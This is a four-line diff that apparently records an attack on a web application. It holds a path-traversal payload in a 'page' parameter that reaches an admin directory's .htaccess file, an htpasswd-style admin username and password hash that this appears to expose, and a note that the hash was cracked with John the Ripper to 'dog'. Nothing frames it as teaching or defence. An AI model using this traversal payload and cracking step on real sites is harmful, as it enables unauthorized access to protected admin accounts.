@@ -1,0 +1,4 @@
+?page=../admin/.htaccess
+
+admin:dXWxIS6i6irN6
+john => dog
